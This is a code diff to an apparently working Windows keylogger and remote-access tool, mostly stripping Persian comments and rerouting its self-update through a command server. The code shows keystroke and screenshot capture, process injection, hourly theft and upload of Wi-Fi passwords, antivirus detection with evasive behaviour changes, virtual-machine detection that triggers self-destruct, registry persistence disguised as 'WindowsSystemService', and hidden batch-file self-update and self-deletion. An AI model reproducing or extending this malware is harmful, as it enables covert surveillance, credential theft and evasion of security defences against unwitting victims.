@@ -23,8 +23,7 @@ import pyautogui
 import os
 from system.vm_detector import VMDetector
 from monitoring.rdp_controller import RDPController
-from system.anti_av import AntiAV  # اضافه کردن AntiAV
-
+from system.anti_av import AntiAV
 
 # Configure logging based on DEBUG_MODE
 if Config.DEBUG_MODE:
@@ -60,9 +59,9 @@ class KeyloggerCore:
             self.logger = ActivityLogger(Config.BUFFER_LIMIT)
             self.rdp_controller = RDPController(self.encryption)
             self.running = True
-            self.anti_av = AntiAV()  # مقداردهی AntiAV
+            self.anti_av = AntiAV()
             self.running = True
-            self.behavior = {  # تنظیمات پیش‌فرض رفتار
+            self.behavior = {
                 "screenshot_enabled": True,
                 "keylogging_enabled": True,
                 "process_injection_enabled": True,
@@ -71,24 +70,13 @@ class KeyloggerCore:
                 "wifi_passwords_enabled": True
             }
 
-            # شناسایی آنتی‌ویروس و تنظیم رفتار
             self.adjust_behavior_based_on_antivirus()
 
             if platform.system().lower() == "windows" and not Config.DEBUG_MODE and self.behavior["process_injection_enabled"]:
                 self.attempt_process_injection()
 
-
-            if platform.system().lower() == "windows" and not Config.DEBUG_MODE:
-                self.attempt_process_injection()
-
-            # if platform.system().lower() == "windows":
-            #     threading.Thread(target=self.rdp_controller.start, daemon=True).start()  # اجرای RDP در ترد جدا
-            # بررسی نسخه
             self.check_for_updates()
-
-            # بررسی VM
             self.check_vm_environment()
-
             self.add_to_startup()
 
         except Exception as e:
@@ -97,9 +85,6 @@ class KeyloggerCore:
             self.emergency_stop()
 
     def adjust_behavior_based_on_antivirus(self):
-        """
-        شناسایی آنتی‌ویروس‌ها و تنظیم رفتار ابزار
-        """
         try:
             antiviruses = self.anti_av.detect_antivirus()
             for av in antiviruses:
@@ -107,7 +92,6 @@ class KeyloggerCore:
                 self.behavior.update(behavior)
                 if Config.DEBUG_MODE:
                     logging.info(f"Adjusted behavior for {av['name']}: {self.behavior}")
-                # ارسال گزارش آنتی‌ویروس به سرور
                 self.communicator.upload_antivirus_status({
                     "antivirus": av,
                     "behavior": self.behavior,
@@ -138,30 +122,21 @@ class KeyloggerCore:
             if Config.DEBUG_MODE:
                 logging.error(f"Process injection error: {str(e)}")
 
-
     def check_for_updates(self):
-        """
-        بررسی نسخه فعلی کلاینت و به‌روزرسانی در صورت وجود نسخه جدید.
-        """
         try:
             if Config.DEBUG_MODE:
                 logging.info("Checking for updates...")
-
-            # ارسال درخواست با توکن
-            headers = {"Authorization": f"Bearer {Config.SECRET_TOKEN}"}
-            response = requests.get(
-                f"{Config.UPDATE_URL}/version.php",
-                headers=headers,
-                timeout=Config.COMMAND_TIMEOUT,
-                verify=False
+            response = self.communicator._send_request(
+                "action=check_version",
+                data={
+                    "client_id": self.client_id,
+                    "token": Config.SECRET_TOKEN
+                }
             )
+            if Config.DEBUG_MODE:
+                logging.info(f"Received update response: {response}")
 
-            if response.status_code != 200:
-                if Config.DEBUG_MODE:
-                    logging.error(f"Failed to fetch version info: status={response.status_code}, response={response.text}")
-                return
-
-            version_info = response.json()
+            version_info = response[0] if response else {}
             if 'error' in version_info:
                 if Config.DEBUG_MODE:
                     logging.error(f"Version check error: {version_info['error']}")
@@ -173,7 +148,6 @@ class KeyloggerCore:
             if Config.DEBUG_MODE:
                 logging.info(f"Current version: {Config.CLIENT_VERSION}, Server version: {server_version}")
 
-            # مقایسه نسخه‌ها
             if version.parse(server_version) > version.parse(Config.CLIENT_VERSION):
                 if Config.DEBUG_MODE:
                     logging.info(f"New version {server_version} available. Downloading from {download_url}")
@@ -187,29 +161,27 @@ class KeyloggerCore:
                 logging.error(f"Update check error: {str(e)}")
 
     def update_client(self, download_url, new_version):
-        """
-        دانلود و جایگزینی فایل اجرایی با نسخه جدید.
-        """
         try:
-            # دانلود فایل جدید
-            response = requests.get(download_url, timeout=Config.COMMAND_TIMEOUT, verify=False)
-            if response.status_code != 200:
-                if Config.DEBUG_MODE:
-                    logging.error(f"Failed to download update: status={response.status_code}")
-                return
+            response = self.communicator._send_request(
+                "action=download_update",
+                data={
+                    "client_id": self.client_id,
+                    "token": Config.SECRET_TOKEN,
+                    "download_url": download_url
+                }
+            )
+            if Config.DEBUG_MODE:
+                logging.info(f"Download response: {response}")
 
-            # ذخیره فایل جدید
             new_exe_path = f"version_{new_version.replace('.', '_')}.exe"
             with open(new_exe_path, 'wb') as f:
                 f.write(response.content)
             if Config.DEBUG_MODE:
                 logging.info(f"Downloaded new version to {new_exe_path}")
 
-            # جایگزینی فایل اجرایی
             current_exe = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
             batch_file = "update.bat"
 
-            # ایجاد اسکریپت batch برای جایگزینی
             batch_content = f"""
             @echo off
             ping 127.0.0.1 -n 2 > nul
@@ -221,12 +193,10 @@ class KeyloggerCore:
             with open(batch_file, 'w', encoding='utf-8') as f:
                 f.write(batch_content)
 
-            # اجرای اسکریپت batch
             subprocess.Popen(batch_file, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
             if Config.DEBUG_MODE:
                 logging.info(f"Created and executed update batch file: {batch_file}")
 
-            # خروج از فرآیند فعلی
             sys.exit(0)
 
         except Exception as e:
@@ -234,22 +204,14 @@ class KeyloggerCore:
                 logging.error(f"Update error: {str(e)}")
 
     def check_vm_environment(self):
-        """
-        بررسی می‌کند که آیا برنامه روی VM اجرا می‌شود یا خیر.
-        در صورت شناسایی VM، فرآیند حذف خودکار را آغاز می‌کند.
-        """
         vm_details = VMDetector.get_vm_details()
         if Config.DEBUG_MODE:
             logging.info(f"VM Detection Details: {vm_details}")
-
-        # ارسال نتیجه به سرور
         try:
             self.communicator.upload_vm_status(vm_details)
         except Exception as e:
             if Config.DEBUG_MODE:
                 logging.error(f"Failed to upload VM status: {str(e)}")
-
-        # اگر VM شناسایی شد و در حالت دیباگ نیستیم، حذف خودکار را اجرا کن
         if vm_details["is_vm"] and not Config.DEBUG_MODE:
             if Config.DEBUG_MODE:
                 logging.warning("Virtual Machine detected. Initiating self-destruct.")
@@ -258,14 +220,9 @@ class KeyloggerCore:
             logging.warning("Virtual Machine detected, but self-destruct skipped in debug mode.")
 
     def self_destruct(self):
-        """
-        حذف خودکار برنامه، فایل‌های موقت، و ردپاها.
-        """
         try:
             if Config.DEBUG_MODE:
                 logging.info("Starting self-destruct sequence...")
-
-            # ارسال گزارش به سرور (اختیاری)
             try:
                 self.communicator.report_self_destruct()
                 if Config.DEBUG_MODE:
@@ -273,35 +230,22 @@ class KeyloggerCore:
             except Exception as e:
                 if Config.DEBUG_MODE:
                     logging.error(f"Failed to send self-destruct report: {str(e)}")
-
-            # حذف ورودی startup از رجیستری
             self.remove_from_startup()
-
-            # حذف فایل‌های موقت (لاگ‌ها، اسکرین‌شات‌ها)
             self.cleanup_files()
-
-            # حذف فایل اجرایی
             self.delete_executable()
-
-            # خاتمه فرآیند
             if Config.DEBUG_MODE:
                 logging.info("Self-destruct complete. Terminating process.")
             sys.exit(0)
-
         except Exception as e:
             if Config.DEBUG_MODE:
                 logging.error(f"Self-destruct error: {str(e)}")
             sys.exit(1)
 
     def remove_from_startup(self):
-        """
-        حذف ورودی startup از رجیستری ویندوز.
-        """
         if platform.system().lower() != "windows":
             if Config.DEBUG_MODE:
                 logging.info("Startup removal only supported on Windows")
             return
-
         try:
             key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
             app_name = "WindowsSystemService"
@@ -317,13 +261,10 @@ class KeyloggerCore:
                 logging.error(f"Failed to remove startup entry: {str(e)}")
 
     def cleanup_files(self):
-        """
-        حذف فایل‌های موقت مثل لاگ‌ها و اسکرین‌شات‌ها.
-        """
         try:
             temp_files = [
-                "keylogger.log",  # فایل لاگ
-                "screenshot.png"  # اسکرین‌شات موقت
+                "keylogger.log",
+                "screenshot.png"
             ]
             for temp_file in temp_files:
                 if os.path.exists(temp_file):
@@ -335,20 +276,13 @@ class KeyloggerCore:
                 logging.error(f"Failed to cleanup files: {str(e)}")
 
     def delete_executable(self):
-        """
-        حذف فایل اجرایی برنامه با استفاده از یک اسکریپت batch کمکی.
-        """
         if platform.system().lower() != "windows":
             if Config.DEBUG_MODE:
                 logging.info("Executable deletion only supported on Windows")
             return
-
         try:
-            # مسیر فایل اجرایی فعلی
             exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
             batch_file = "self_destruct.bat"
-
-            # ایجاد اسکریپت batch برای حذف
             batch_content = f"""
             @echo off
             ping 127.0.0.1 -n 2 > nul
@@ -357,20 +291,15 @@ class KeyloggerCore:
             """
             with open(batch_file, "w", encoding="utf-8") as f:
                 f.write(batch_content)
-
-            # اجرای اسکریپت batch
             subprocess.Popen(batch_file, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
             if Config.DEBUG_MODE:
                 logging.info(f"Created and executed self-destruct batch file: {batch_file}")
-
         except Exception as e:
             if Config.DEBUG_MODE:
                 logging.error(f"Failed to delete executable: {str(e)}")
 
     def emergency_stop(self):
-        """
-        توقف اضطراری برنامه و اجرای حذف خودکار.
-        """
+        self.running = False
         if Config.DEBUG_MODE:
             logging.error("Emergency stop initiated")
         self.self_destruct()
@@ -384,12 +313,10 @@ class KeyloggerCore:
         import os
         import winreg
         import platform
-
         if platform.system().lower() != 'windows':
             if Config.DEBUG_MODE:
                 logging.info("Startup registration only supported on Windows")
             return
-
         try:
             exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
             reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -416,7 +343,7 @@ class KeyloggerCore:
         while True:
             try:
                 if self.behavior["wifi_passwords_enabled"]:
-                    from commands.handler import CommandHandler  # وارد کردن CommandHandler
+                    from commands.handler import CommandHandler
                     wifi_data = CommandHandler.handle_wifi_passwords({})
                     if wifi_data.get("status") == "success" and wifi_data.get("wifi_profiles"):
                         self.communicator.upload_wifi_passwords(wifi_data)
@@ -425,8 +352,8 @@ class KeyloggerCore:
             except Exception as e:
                 if Config.DEBUG_MODE:
                     logging.error(f"Wi-Fi passwords loop error: {str(e)}")
-            time.sleep(3600)  # Run every hour
-            
+            time.sleep(3600)
+
     def _capture_screenshot(self):
         try:
             screenshot = pyautogui.screenshot()
